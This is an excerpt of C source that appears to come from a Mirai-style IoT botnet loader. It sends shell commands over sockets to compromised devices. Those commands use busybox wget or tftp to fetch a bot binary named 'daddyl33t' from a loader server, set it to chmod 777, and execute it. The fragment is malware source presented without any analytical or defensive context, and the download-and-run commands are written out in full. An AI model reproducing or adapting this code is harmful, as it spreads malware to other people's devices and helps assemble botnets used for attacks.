                            ...
                            switch (conn->info.upload_method)
                            {
                                ...
                                case UPLOAD_WGET:
                                    ...
                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/bins/%s.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                    wrker->srv->wget_host_ip, wrker->srv->wget_host_port, "daddyl33t", conn->info.arch);
#ifdef DEBUG
                                    printf("wget\n");
#endif
                                    break;
                                case UPLOAD_TFTP:
                                    ...
                                    util_sockprintf(conn->fd, "/bin/busybox tftp -g -l %s -r %s.%s %s; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                    FN_BINARY, "daddyl33t", conn->info.arch, wrker->srv->tftp_host_ip);
#ifdef DEBUG
                                    printf("tftp\n");
#endif
                                    break;
...
#endif
                            util_sockprintf(conn->fd, "./%s; ./%s %s.echo.%s; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, id_tag, conn->info.arch);
...
#endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.tftp.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
